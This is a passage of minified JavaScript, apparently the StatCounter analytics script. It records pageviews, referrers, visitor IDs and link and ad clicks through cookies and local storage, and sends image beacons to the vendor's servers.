RegExp("^https","i");if(sc_doc_loc.match(myRE)){sc_http_url="https"}if(window.sc_local){sc_base_dir=sc_local}else{if(sc_cls==-1){sc_cls=1}sc_base_dir=sc_http_url+"://"+sc_dc+"."+sc_host+"/"}sc_click_dir=sc_base_dir;if(window.sc_counter_target){sc_base_dir+=window.sc_counter_target+"?"}else{if(window.sc_text){sc_base_dir+="text.php?"}else{sc_base_dir+="t.php?"}}if(window.sc_project){if(sc_project=="4135125"||sc_project=="6169619"||sc_project=="6222332"||sc_project=="5106510"||sc_project=="6311399"||sc_project=="6320092"||sc_project=="5291656"||sc_project=="7324465"||sc_project=="6640020"||sc_project=="4629288"||sc_project=="1480088"||sc_project=="2447031"){if(Math.floor(Math.random()*6)!=1){sc_remove=1}}sc_base_dir+="sc_project="+sc_project}else{if(window.usr){sc_base_dir+="usr="+usr}else{sc_error=1}}if(window.sc_remove_link){sc_link_back_start="";sc_link_back_end=""}else{sc_link_back_start="<a class=\"statcounter\" href=\"http://www."+sc_host+"\" target=\"_blank\">";sc_link_back_end="</a>"}sc_date=new Date();sc_time=sc_date.getTime();sc_time_difference=3600000;sc_title=""+document.title;sc_url=""+document.location;sc_title=sc_title.substring(0,300);sc_url=sc_url.substring(0,300);if(encodeURIComponent){sc_title=encodeURIComponent(sc_title)}else{sc_title=escape(sc_title)}sc_url=escape(sc_url);if(window.sc_security){sc_security_code=sc_security}if(sc_script_num){sc_script_num++}else{var sc_script_num=1}if(typeof _sc_imgs=="undefined"){var _sc_imgs={}}var sc_pageview_tag_string="";var _sc_project_int=parseInt(sc_project,10);var _sc_epoch_now=new Date();var _sc_epoch_days=Math.floor(_sc_epoch_now/86400000);var _sc_days_elapsed=_sc_epoch_days-17869;var _sc_fix_threshold=11200000-(_sc_days_elapsed*12223);var _sc_fix_min_threshold=9000000;if(_sc_fix_threshold<_sc_fix_min_threshold){_sc_fix_threshold=_sc_fix_min_threshold}var _sc_apply_mar_2017_fixes=_sc_project_int==4344864||_sc_project_int==4124138||_sc_project_int==204609||_sc_project_int>_sc_fix_threshold;(function(_25,_26,_27,_28){var _29="";var _2a={"google":null,"bing":["q"],"search.yahoo":null,"m.yahoo":null,"m2.yahoo":null,"baidu":["wd","word"],"yandex":["text"],"ya.ru":["text"],"haosou":["q"],"so.com":["q"],"360.cn":["q"],"360sou":["q"],"aol":["query","q"],"duckduckgo":null,"ask.com":["q","QUERYT"],"mail.ru":["words"],"sogou":["q","query"]};var _2b={"fb":["facebook.com","fb.me"],"pi":["pinterest.com"],"tw":["twitter.com","t.co"],"ln":["linkedin.com"],"gp":["plus.google.com","plus.url.google.com"]};function check_root_domains_match(a,b){var _2e=a.split(".");var _2f=b.split(".");var _30=Math.min(_2e.length,_2f.length);var _31=2;if(_2e.length>1&&((_2e[_2e.length-2].length<=3&&_2e[_2e.length-1] in {"at":1,"au":1,"br":1,"es":1,"hu":1,"il":1,"nz":1,"tr":1,"uk":1,"us":1,"za":1})||_2e[_2e.length-1]=="kr"||_2e[_2e.length-1]=="ru"||(_2e[_2e.length-1]=="au"&&_2e[_2e.length-2] in {"csiro":1})||(_2e[_2e.length-1]=="at"&&_2e[_2e.length-2] in {"priv":1})||(_2e[_2e.length-1]=="fr"&&_2e[_2e.length-2] in {"avocat":1,"aeroport":1,"veterinaire":1})||(_2e[_2e.length-1]=="hu"&&_2e[_2e.length-2] in {"film":1,"lakas":1,"ingatlan":1,"sport":1,"hotel":1})||(_2e[_2e.length-1]=="nz"&&_2e[_2e.length-2] in {"geek":1,"kiwi":1,"maori":1,"school":1,"govt":1,"health":1,"parliament":1})||(_2e[_2e.length-1]=="il"&&_2e[_2e.length-2] in {"muni":1})||(_2e[_2e.length-1]=="za"&&_2e[_2e.length-2] in {"school":1})||(_2e[_2e.length-1]=="tr"&&_2e[_2e.length-2] in {"name":1})||(_2e[_2e.length-1]=="uk"&&_2e[_2e.length-2] in {"police":1}))){_31=3}for(var i=1;i<=_30;i++){if(_2e[_2e.length-i]!=_2f[_2f.length-i]){return false}if(i>=_31){return true}}return _2e.length==_2f.length}function classify_referrer(r){if(r==""){return "d"}var _34=r.split("/")[2].replace(/^www\./,"");var _35=document.location.host.replace(/^www\./,"");if(_sc_apply_mar_2017_fixes){if(_35==_34){return "internal"}if(check_root_domains_match(_34,_35)){return "internal"}}if(r.search(/\bgoogle\..*\?.*adurl=http/)!==-1){return "p"}var _36=["utm_source=bing","gclid=","utm_medium=cpc","utm_medium=paid-media","utm_medium=ppc","aclk?","cid="];for(var i=0;i<_36.length;i++){if(document.location.search.indexOf(_36[i])!==-1){return "p"}}var _38=["utm_medium=email"];for(var i=0;i<_38.length;i++){if(document.location.search.indexOf(_38[i])!==-1){return "e"}}if(!_sc_apply_mar_2017_fixes){if(_35==_34){return "internal"}}for(var _39 in _2a){if(_34.replace(_39,"#").split(".").indexOf("#")!==-1){if(_2a[_39]===null){return _39}for(var i=0;i<_2a[_39].length;i++){var _3a=_2a[_39][i];if(r.indexOf("?"+_3a+"=")!==-1||r.indexOf("&"+_3a+"=")!==-1){return _39}}}}for(var _3b in _2b){for(var i=0;i<_2b[_3b].length;i++){var _39=_2b[_3b][i];if(_34.replace(_39,"#").split(".").indexOf("#")!==-1){return _3b}}}return _34}function categorize_class(cls){if(cls=="d"||cls=="p"||cls=="e"||cls=="internal"){return cls}if(cls in _2a){return "o"}if(cls in _2b){return "s"}return "r"}if(sc_remove!=1){if(document.webkitVisibilityState!="prerender"){sc_prerendering=0}else{sc_prerendering=1;document.addEventListener("webkitvisibilitychange",function(evt){if(sc_prerendering==1){sc_prerendering=2;sc_send_data()}else{return}},false)}}var _3e=parseInt(sc_project,10);var _3f=_3e==9560334||_3e==6709687||_3e==9879613||_3e==4124138||_3e==204609||_3e==10776808;try{var _40=Math.pow(_26,_27),_41=Math.pow(2,_28),_42=_41*2,_43=_26-1;var _44;var _45=function(_46,_47){var key=[];var _49=mixkey(flatten(_47?[_46,tostring(_25)]:0 in arguments?_46:autoseed(),3),key);var _4a=new ARC4(key);mixkey(tostring(_4a.S),_25);_44=function(){var n=_4a.g(_27),d=_40,x=0;while(n<_41){n=(n+x)*_26;d*=_26;x=_4a.g(1)}while(n>=_42){n/=2;d/=2;x>>>=1}return (n+x)/d};return _49};function ARC4(key){var t,_50=key.length,me=this,i=0,j=me.i=me.j=0,s=me.S=[];if(!_50){key=[_50++]}while(i<_26){s[i]=i++}for(i=0;i<_26;i++){s[i]=s[j=_43&(j+key[i%_50]+(t=s[i]))];s[j]=t}(me.g=function(_55){var t,r=0,i=me.i,j=me.j,s=me.S;while(_55--){t=s[i=_43&(i+1)];r=r*_26+s[_43&((s[i]=s[j=_43&(j+t)])+(s[j]=t))]}me.i=i;me.j=j;return r})(_26)}function flatten(obj,_59){var _5a=[],typ=(typeof obj)[0],_5c;if(_59&&typ=="o"){for(_5c in obj){try{_5a.push(flatten(obj[_5c],_59-1))}catch(e){}}}return (_5a.length?_5a:typ=="s"?obj:obj+"\x00")}function mixkey(_5d,key){var _5f=_5d+"",_60,j=0;while(j<_5f.length){key[_43&j]=_43&((_60^=key[_43&j]*19)+_5f.charCodeAt(j++))}return tostring(key)}function autoseed(_62){try{window.crypto.getRandomValues(_62=new Uint8Array(_26));return tostring(_62)}catch(e){return [+new Date,window,window.navigator.plugins,window.screen,tostring(_25)]}}function tostring(a){return String.fromCharCode.apply(0,a)}mixkey(Math.random(),_25);function _localStorageAvailable(){var _64=false;if("localStorage" in window){try{_64=window["localStorage"]!==null}catch(e){if(!e.name||e.name.toLowerCase().replace(/_/g,"").substring(0,16)!=="quotaexceedederr"){if(!e.number||parseInt(e.number,10)!==-2147024891){throw e}}}}return _64}function _setLocalStorage(_65,_66,_67){if(_localStorageAvailable()){try{if(_65==="is_visitor_unique"){localStorage.setItem("statcounter.com/localstorage/",_66)}else{localStorage.setItem("statcounter_"+_65,_66)}}catch(e){if(!e.name||e.name.toLowerCase().replace(/_/g,"").substring(0,16)!=="quotaexceedederr"){if(!e.number||parseInt(e.number,10)!==-2147024891){throw e}}return false}return true}return false}function setLocal(_68,_69,_6a,_6b,_6c){if(typeof _69==="string"){_69=[_69]}if(_6b===undefined){_6b=""}if(_6c===undefined){_6c=30}var _6d=false;if(sc_sp=="localStorage"){_6d=_setLocalStorage(_68,_6b+_69.join("-"),_6a);if(!_6d){_6d=_writeCookie(_68,_6b+_69.join("-"),_6a)}else{if(_readCookie(_68)!==null){_removeCookie(_68,_6a)}}}else{cookie_value=_69.slice(0,_6c).join("-");_6d=_writeCookie(_68,_6b+cookie_value,_6a);if(!_6d){_6d=_setLocalStorage(_68,_6b+_69.join("-"),_6a)}else{if(_69.length>_6c){_setLocalStorage(_68,"mx"+_69.slice(_6c).join("-"),_6a)}else{_removeLocalStorage(_68)}}}return _6d}function getLocal(_6e){var val=null;if(_localStorageAvailable()){if(_6e==="is_visitor_unique"){val=localStorage.getItem("statcounter.com/localstorage/")}else{val=localStorage.getItem("statcounter_"+_6e)}}if(sc_sp=="localStorage"&&val!==null&&val.substring(0,2)=="rx"){return val}var _70=_readCookie(_6e);if(val!==null){if(_70===null&&val.substring(0,2)=="rx"){return val}else{if(_70!==null&&val.substring(0,2)=="mx"){_70+="-"+val.substring(2)}}}return _70}function _removeLocalStorage(_71){if(_localStorageAvailable()){if(_71==="is_visitor_unique"){localStorage.removeItem("statcounter.com/localstorage/")}localStorage.removeItem("statcounter_"+_71)}}function removeLocal(_72,_73){_removeLocalStorage(_72);if(_readCookie(_72)){_removeCookie(_72,_73)}}function _readCookie(_74){var _75="sc_"+_74+"=";if(document.cookie){var ca=document.cookie.split(";");for(var i=0;i<ca.length;i++){var c=ca[i];while(c.charAt(0)==" "){c=c.substring(1,c.length)}if(c.indexOf(_75)==0){return c.substring(_75.length,c.length)}}}return null}function _writeCookie(_79,_7a,_7b,_7c){if(_7c===undefined){var _7d=1000*60*60*24*365*2}else{var _7d=1000*_7c}expiration=new Date();expiration.setTime(expiration.getTime()+_7d);var _7e=3050;if(_7a.length>_7e-50&&_7a.substring(0,_7e).indexOf("-")!==-1){_7a=_7a.substring(0,_7a.substring(0,_7e).lastIndexOf("-"))}document.cookie="sc_"+_79+"="+_7a+"; expires="+expiration.toGMTString()+"; domain="+_7b+"; path=/";if(_readCookie(_79)!==null){return true}else{return false}}function _removeCookie(_7f,_80){document.cookie="sc_"+_7f+"=; expires=Thu, 01 Jan 1970 00:00:01 GMT; domain="+_80+"; path=/"}function detectBrowserFeatures(){var _81=[];var i;var _83;var _84={pdf:"application/pdf",qt:"video/quicktime",realp:"audio/x-pn-realaudio-plugin",wma:"application/x-mplayer2",dir:"application/x-director",fla:"application/x-shockwave-flash",java:"application/x-java-vm",gears:"application/x-googlegears",ag:"application/x-silverlight"};var _85=(new RegExp("Mac OS X.*Safari/")).test(navigator.userAgent)?window.devicePixelRatio||1:1;if(!((new RegExp("MSIE")).test(navigator.userAgent))){if(navigator.mimeTypes&&navigator.mimeTypes.length){for(i in _84){if(Object.prototype.hasOwnProperty.call(_84,i)){_83=navigator.mimeTypes[_84[i]];_81.push((_83&&_83.enabledPlugin)?"1":"0")}}}if(typeof navigator.javaEnabled!=="unknown"&&typeof navigator.javaEnabled!=="undefined"&&navigator.javaEnabled()){_81.push("java")}if(typeof window.GearsFactory==="function"){_81.push("gears")}}_81.push(screen.width*_85+"x"+screen.height*_85);return _81.join("")}function generate_uuid(){var now=new Date();var _87=false;var _88=32;if(_87){_88=36}var _89=Math.round(now.getTime()/1000)+now.getMilliseconds();var _8a=(navigator.userAgent||"")+(navigator.platform||"")+detectBrowserFeatures()+now.getTimezoneOffset()+window.innerWidth+window.innerHeight+window.screen.colorDepth+document.URL+_89;_45(_8a);var _8b="0123456789ABCDEF".split(""),_8c=new Array(_88),rnd=0,r;for(var i=0;i<_88;i++){if(_87&&(i==8||i==13||i==18||i==23)){_8c[i]="-"}else{if((i==12&&!_87)||(i==14&&_87)){_8c[i]="4"}else{if((i==13&&!_87)||(i==15&&_87)){_8c[i]="F"}else{if(rnd<=2){rnd=33554432+(_44()*16777216)|0}r=rnd&15;rnd=rnd>>4;_8c[i]=_8b[(i==19)?(r&3)|8:r]}}}}return _8c.join("")}if(!_sc_apply_mar_2017_fixes){var _90=classify_referrer(sc_referer);var _91=categorize_class(_90);if(_90!="internal"){_29="&rcat="+_91+"&rdom="+_90}}var _92=Math.round((new Date()).getTime()/1000);if(sc_sp!="disabled"){if(_sc_apply_mar_2017_fixes){var _90=classify_referrer(sc_referer);var _91=categorize_class(_90);if(_90!="internal"){_29="&rcat="+_91+"&rdom="+_90}}try{var _93=JSON.parse(localStorage.getItem("sc_medium_source"));if(_93==null){_93={}}var _94=null;var _95=null;var _96=null;var msl=0;for(var k in _93){if(_94===null||_93[k]>_93[_94]){_94=k}var _99=categorize_class(k);if(_91==_99&&(_95===null||_93[k]>_93[_95])){_95=k}if(_99=="r"&&(_96===null||_93[k]<_93[_96])){_96=k}msl+=1}if(msl>30&&_96!==null){delete _93[_96]}var _9a="";if(sessionStorage.getItem("statcounter_bounce")){sessionStorage.removeItem("statcounter_bounce");_9a="&bb=0"}var _9b=30;if(!_sc_apply_mar_2017_fixes){_9b=15}if(_90=="d"&&_94!==null&&_94!="d"&&(_92-_93[_94])<60*_9b){_90="internal"}if(_sc_apply_mar_2017_fixes){if(sessionStorage.getItem("statcounter_session")&&(_92-parseInt(sessionStorage.getItem("statcounter_session"),10))<60*30){_90="internal"}sessionStorage.setItem("statcounter_session",_92)}if(!_sc_apply_mar_2017_fixes){if(_91=="r"&&sessionStorage.getItem("statcounter_exit_domain")==_90){_90="internal"}}if(_90=="internal"){if(_94!==null){_29="&rcat="+categorize_class(_94)+"&rdomo="+_94;_29+="&rdomg="+(_92-_93[_94]);_93[_94]=_92}}else{var _9c=false;if(_90 in _93){if(_90==_94){_29=_29.replace("rdom=","rdomo=")}_29+="&rdomg="+(_92-_93[_90]);if(_92-_93[_90]<60*30){_9c=true}}else{_29+="&rdomg=new"}if(_9a==""&&!_9c){sessionStorage.setItem("statcounter_bounce","1");_9a="&bb=1"}if(_95!==null&&(!(_90 in _93)||_90!=_95)){_29+="&rcatg="+(_92-_93[_95])}_93[_90]=_92}_29+=_9a;try{localStorage.setItem("sc_medium_source",JSON.stringify(_93))}catch(maybe_not_enough_space){if(_sc_apply_mar_2017_fixes){_29=""}}}catch(e){if(_sc_apply_mar_2017_fixes){_29=""}}if(_3e==10227105){try{var _9d=new Image();_9d.src="http://statcounter.com/feedback/?email=javascript@statcounter.com&page_url="+encodeURIComponent(document.location.protocol+"//"+document.location.host+document.location.pathname+document.location.search+document.location.hash)+"&name=Auto%20JS&feedback_username=statcounter&pid="+sc_project+"&fake_post&user_company&feedback=consistent%20uniques%20js%20exception:%20"+encodeURIComponent(localStorage.getItem("statcounter.com/localstorage/")+":::"+_readCookie("is_visitor_unique"))}catch(ignore){}}var _9e="1.1.1.1.1.1.1.1.1";if(typeof window.sc_cookie_domain=="undefined"){var _9f=window.location.host}if(_9f.substring(0,1)!="."){_9f="."+_9f}var _a0="is_visitor_unique";try{var _a1=getLocal(_a0)}catch(e){var _a1=false;sc_uuid=".ex"}var _a2=[];var _a3=[];if(_a1&&_a1.substring(0,2)=="rx"){removeLocal(_a0,_9f);var _a4=_a1.substring(2);_a2=_a4.split("-");var _a5=false;var _a6=false;for(var i=0;i<_a2.length;i++){var _a8=_a2[i].split(".");if(_a8[0]==sc_project){_a5=true;var _a9=parseInt(_a8[1],10);var _aa=[30,60,120,180,360,720,1440,2880,10080];var _ab=[];var _ac=2;if(_a8[2].length==32){sc_uuid="."+_a8[2];_ac=3}else{sc_uuid=_a6}for(var ir=0;ir<_aa.length;ir++){var _ae=parseInt(_a8[ir+_ac],10);if(isNaN(_ae)){_ae=1}_ab.push(_ae)}sc_unique_returning+="&jg="+(_92-_a9);for(var ir=0;ir<_aa.length;ir++){if(_29.indexOf("rdom=")!==-1){_ab[ir]++}else{if(_92>(_a9+60*_aa[ir])){_ab[ir]++}}}sc_unique_returning+="&rr="+_ab.join(".");_a3.push(sc_project+"."+_92+sc_uuid+"."+_ab.join("."))}else{_a3.push(_a2[i]);if(i==0&&_a8[2].length==32&&sc_uuid==""){sc_uuid="."+_a8[2]}}if(i==0){_a6=sc_uuid}}if(!_a5){if(_a3.length==0&&sc_uuid==""){sc_uuid="."+generate_uuid()}_a3.push(sc_project+"."+_92+sc_uuid+"."+_9e);sc_unique_returning+="&jg=new&rr="+_9e}_a3.sort(function(a,b){return parseInt(b.split(".")[1],10)-parseInt(a.split(".")[1],10)});for(var iv=1;iv<_a3.length;iv++){_a3[iv]=_a3[iv].replace("."+_a3[0].split(".")[2]+".",".")}setLocal(_a0,_a3,_9f,"rx",3)}else{if(sc_uuid!=".ex"){sc_uuid="."+generate_uuid();_a3=[sc_project+"."+_92+sc_uuid+"."+_9e];var _b2=setLocal(_a0,_a3,_9f,"rx",3);if(_b2){sc_unique_returning+="&jg=new&rr="+_9e}else{sc_uuid=".na"}}}if(sc_uuid!=""){sc_uuid_q="&u1="+sc_uuid.substring(1)}}else{}}catch(e){if(_3f){if(typeof encodeURIComponent!="function"){encodeURIComponent=function(s){return escape(s)}}var _b4="";_b4+="unique_returning: "+sc_unique_returning+"\n";_b4+="uuid: "+sc_uuid+"\n";_b4+="cookie_projects_in: rx"+_a2.join("-")+"\n";_b4+="cookie_projects_out: rx"+_a3.join("-")+"\n";for(var _b5 in e){_b4+="property: "+_b5+" value: ["+e[_b5]+"]\n"}_b4+="toString(): "+" value: ["+e.toString()+"]\n";var _9d=new Image();_9d.src="http://statcounter.com/feedback/?email=javascript@statcounter.com&page_url="+encodeURIComponent(document.location.protocol+"//"+document.location.host+document.location.pathname+document.location.search+document.location.hash)+"&name=Auto%20JS&feedback_username=statcounter&pid="+sc_project+"&fake_post&user_company&feedback=consistent%20uniques%20js%20exception:%20"+encodeURIComponent(_b4)}sc_unique_returning="";sc_uuid_q="&u1=f2"}if(Object.prototype.toString.call(_statcounter_pending)==="[object Array]"){var _b6=_statcounter_pending.length;if(_b6>=1){sc_pageview_tag_string=getTagString(_statcounter_pending[0])}}sc_base_dir+="&java=1&security="+sc_security_code+sc_uuid_q;var _b7=sc_unique_returning+"&resolution="+sc_width+"&h="+sc_height+"&camefrom="+escape(sc_referer.substring(0,600))+"&u="+sc_url+"&t="+sc_title+_29+"&sc_snum="+sc_script_num+sc_pageview_tag_string+"&sess=4ea83c";if(window.sc_counter_width&&window.sc_counter_height){sc_counter_size=" width=\""+sc_counter_width+"\" height=\""+sc_counter_height+"\""}if(window.sc_remove_alt){sc_alt_text=""}if(sc_error==1){document.writeln("Code corrupted. Insert fresh copy.")}else{if(sc_remove==1){}else{sc_send_data()}}function sc_send_data(){if(sc_inv==1||sc_prerendering==2){_b7+="&p="+sc_prerendering+"&invisible=1";if(window.sc_call){sc_call++}else{sc_call=1}var _b8=false;if(sc_uuid!=""&&typeof JSON=="object"&&JSON&&typeof JSON.stringify=="function"&&"sessionStorage" in window){_b8=true}var _b9=false;if(_b8){try{var _ba=sessionStorage.getItem("statcounter_pending");if(!_ba){var _bb={}}else{try{var _bb=JSON.parse(_ba)}catch(ignore){var _bb={}}}if(_bb[sc_project]===undefined){_bb[sc_project]={}}var now=new Date().getTime();_bb[sc_project][now]=_b7;while(true){_ba=JSON.stringify(_bb);if(_ba=="{}"){sessionStorage.removeItem("statcounter_pending");break}var _bd=_ba.split(/:.{20}/).length-1;if(_bd<20){var _be=true;try{sessionStorage.setItem("statcounter_pending",_ba)}catch(e){if(!e.name||e.name.toLowerCase().replace(/_/g,"").substring(0,16)!=="quotaexceedederr"){throw e}_be=false}if(_be){break}}var _bf=false;var _c0=false;var _c1=false;for(var _c2 in _bb){for(var _c3 in _bb[_c2]){var _c4=/jg=(\d+)/.exec(_bb[_c2][_c3]);if(_c4!==null){var _c5=parseInt(_c4[1])}else{var _c5=false}if(_bf===false||(_c5!==false&&_c5<_bf)){if(_c5!==false){_bf=_c5}_c0=_c2;_c1=_c3}}}if(_c1===false){break}delete _bb[_c0][_c1];if(JSON.stringify(_bb[_c0])=="{}"){delete _bb[_c0]}}for(var ts in _bb[sc_project]){(function(_c7,_c8){var _c9=_bb[_c8][_c7];_sc_imgs[sc_call+"."+_c7]=new Image();_sc_imgs[sc_call+"."+_c7].onload=function(){var _ca=JSON.parse(sessionStorage.getItem("statcounter_pending"));if(_ca[_c8]!==undefined){delete _ca[_c8][_c7];if(JSON.stringify(_ca[_c8])=="{}"){delete _ca[_c8]}}var _cb=JSON.stringify(_ca);if(_cb=="{}"){sessionStorage.removeItem("statcounter_pending")}else{sessionStorage.setItem("statcounter_pending",_cb)}};if(_c7!=now){_c9+="&pg="+Math.round((now-_c7)/1000)}else{_b9=true}_sc_imgs[sc_call+"."+_c7].src=sc_base_dir+"&sc_random="+Math.random()+_c9})(parseInt(ts,10),sc_project)}}catch(e){if(_3f){if(typeof encodeURIComponent!="function"){encodeURIComponent=function(s){return escape(s)}}var _cd="";for(var _ce in e){_cd+="e["+_ce+"]: "+e[_ce]+"\n"}_cd+="unique_returning: "+sc_unique_returning+"\n";_cd+="uuid: "+sc_uuid+"\n";_cd+="toString(): "+" value: ["+e.toString()+"]\n";var _cf=new Image();_cf.src="http://statcounter.com/feedback/?email=javascript@statcounter.com&page_url="+encodeURIComponent(document.location.protocol+"//"+document.location.host+document.location.pathname+document.location.search+document.location.hash)+"&name=Auto%20JS&feedback_username=statcounter&pid="+sc_project+"&fake_post&user_company&feedback=pending%20exception:%20"+encodeURIComponent(_cd)}}}if(!_b8||!_b9){_sc_imgs[sc_call]=new Image();_sc_imgs[sc_call].src=sc_base_dir+"&sc_random="+Math.random()+_b7}}else{var _d0=sc_base_dir+"&sc_random="+Math.random()+_b7+"&p="+sc_prerendering;_d0=_d0.replace(/&/g,"&amp;");if(window.sc_text){document.writeln("<scr"+"ipt"+" src="+_d0+"&amp;text="+sc_text+"></scr"+"ipt>")}else{document.writeln("<span class=\"statcounter\">"+sc_link_back_start+"<img src=\""+_d0+"\" alt=\""+sc_alt_text+"\" border=\"0\""+sc_counter_size+">"+sc_link_back_end+"</span>")}}}})([],256,6,52);if(sc_cls>0){if(clickstat_done!=1){var clickstat_done=1;var clickstat_project=window.sc_project;var clickstat_security=window.sc_security_code;var dlext="7z|aac|avi|csv|doc|docx|exe|flv|gif|gz|jpe?g|js|mp(3|4|e?g)|mov|pdf|phps|png|ppt|rar|sit|tar|torrent|txt|wma|wmv|xls|xlsx|xml|zip";if(typeof (window.sc_download_type)=="string"){dlext=window.sc_download_type}var ltype="https?|ftp|telnet|ssh|ssl|mailto|spotify|tel";var second="ac|co|gov|ltd|me|mod|net|nic|nhs|org|plc|police|sch|com";var dl=new RegExp("\\.("+dlext+")$","i");var lnk=new RegExp("^("+ltype+"):","i");var domsec=new RegExp("^("+second+")$","i");var host_name=location.host.replace(/^www\./i,"");var host_splitted=host_name.split(".");var domain=host_splitted.pop();var host_split=host_splitted.pop();if(domsec.test(host_split)){domain=host_split+"."+domain;host_split=host_splitted.pop()}domain=host_split+"."+domain;var lnklocal_mask="^https?://(.*)("+domain+"|webcache.googleusercontent.com)";var lnklocal=new RegExp(lnklocal_mask,"i");if(document.getElementsByTagName){var anchors=document.getElementsByTagName("a");for(var i=0;i<anchors.length;i++){var anchor=anchors[i];if(anchor.onmousedown){var original_click=anchor.onmousedown;var s=original_click.toString().split("\n").join(" ");var bs=s.indexOf("{");var head=s.substr(0,bs);var ps=head.indexOf("(");var pe=head.indexOf(")");var params=head.substring(ps+1,pe);var plist=params.split(",");var body=s.substr(bs+1,s.length-bs-2);var insert="sc_clickstat_call(this,'"+sc_click_dir+"');";var final_body=insert+body;var ev_head="new Function(";var ev_params="";var ev_sep="";for(var sc_i=0;sc_i<plist.length;sc_i++){ev_params=ev_sep+"'"+plist[sc_i]+"'";ev_sep=","}if(ev_sep==","){ev_params+=","}var ev_foot="final_body);";var ev_final=ev_head+ev_params+ev_foot;anchor.onmousedown=eval(ev_final)}else{anchor.onmousedown=new Function("event","sc_clickstat_call(this,'"+sc_click_dir+"');return true;")}}}function sc_none(){return}function sc_delay(){if(window.sc_click_stat){var d=window.sc_click_stat}else{var d=0}var n=new Date();var t=n.getTime()+d;while(n.getTime()<t){var n=new Date()}}function sc_clickstat_call(_d4,_d5){if(_d4){var _d6=0;if(lnk.test(_d4)){if((lnklocal.test(_d4))){if(dl.test(_d4)){_d6=1}else{if(window.sc_exit_link_detect&&new RegExp(sc_exit_link_detect,"i").test(_d4)){_d6=2}else{if(sc_cls==2){_d6=2}}}}else{_d6=2}}if(_d6!=0){var _d7=escape(_d4);if(_d7.length>0){if(sc_unique_returning==""){sc_unique_returning="&jg=&rr="}if(!_sc_apply_mar_2017_fixes){if(_d6==2&&sc_sp!="disabled"){try{sessionStorage.setItem("statcounter_exit_domain",_d7.split("/")[2].replace(/^www\./,""))}catch(ignore){}}}var _d8=_d5+"click.gif?sc_project="+clickstat_project+"&security="+clickstat_security+"&c="+_d7+"&m="+_d6+"&u="+sc_url+"&t="+sc_title+"&sess=4ea83c&rand="+Math.random()+sc_uuid_q+sc_unique_returning;var _d9=new Image();_d9.onload=sc_none;_d9.src=_d8;sc_delay()}}}}var sc_gsyn_pattern="googlesyndication.com|ypn-js.overture.com|ypn-js.ysm.yahoo.com|googleads.g.doubleclick.net";var sc_gsyn_pattern2="^aswift_[0-9]+$";var sc_px;var sc_py;function sc_adsense_click(_da){if(_da.src.match(sc_gsyn_pattern)){var _db=escape(_da.src)}else{var _db=escape("Google Adsense "+_da.width+"x"+_da.height)}var i=new Image();var _dd=sc_click_dir+"click.gif?sc_project="+clickstat_project+"&security="+clickstat_security+"&c="+_db+"&m=2&u="+sc_url+"&t="+sc_title+"&sess=4ea83c&rand="+Math.random()+sc_uuid_q+sc_unique_returning;i.src=_dd;sc_delay()}function sc_adsense_init(){if(document.all&&typeof window.opera=="undefined"){var el=document.getElementsByTagName("iframe");for(var i=0;i<el.length;i++){if(el[i].src.match(sc_gsyn_pattern)||el[i].id.match(sc_gsyn_pattern2)){el[i].onfocus=function(){sc_adsense_click(this)}}}}else{if(typeof window.addEventListener!="undefined"){window.addEventListener("unload",sc_exitpage,false);window.addEventListener("mousemove",sc_getmouse,true)}}}if(typeof window.addEventListener!="undefined"){window.addEventListener("load",sc_adsense_init,false)}else{if(typeof document.addEventListener!="undefined"){document.addEventListener("load",sc_adsense_init,false)}else{if(typeof window.attachEvent!="undefined"){window.attachEvent("onload",sc_adsense_init)}else{if(typeof window.onload=="function"){var sc_existing=onload;window.onload=function(){sc_existing();sc_adsense_init()}}else{window.onload=sc_adsense_init}}}}function sc_getmouse(e){if(typeof e.pageX=="number"){sc_px=e.pageX;sc_py=e.pageY}else{if(typeof e.clientX=="number"){sc_px=e.clientX;sc_py=e.clientY;if(document.body&&(document.body.scrollLeft||document.body.scrollTop)){sc_px+=document.body.scrollLeft;sc_py+=document.body.scrollTop}else{if(document.documentElement&&(document.documentElement.scrollLeft||document.documentElement.scrollTop)){sc_px+=document.documentElement.scrollLeft;sc_py+=document.documentElement.scrollTop}}}}}function sc_findy(obj){var y=0;while(obj){y+=obj.offsetTop;obj=obj.offsetParent}return (y)}function sc_findx(obj){var x=0;while(obj){x+=obj.offsetLeft;obj=obj.offsetParent}return (x)}function sc_exitpage(e){ad=document.getElementsByTagName("iframe");if(typeof sc_px=="undefined"){return}for(var i=0;i<ad.length;i++){var _e7=sc_findx(ad[i]);var _e8=sc_findy(ad[i]);var adW=parseInt(_e7,10)+parseInt(ad[i].width,10)+15;var adH=parseInt(_e8,10)+parseInt(ad[i].height,10)+10;var _eb=(sc_px>(_e7-10)&&sc_px<adW);var _ec=(sc_py>(_e8-10)&&sc_py<adH);if(_ec&&_eb){if(ad[i].src.match(sc_gsyn_pattern)||ad[i].id.match(sc_gsyn_pattern2)){sc_adsense_click(ad[i])}}}}}}
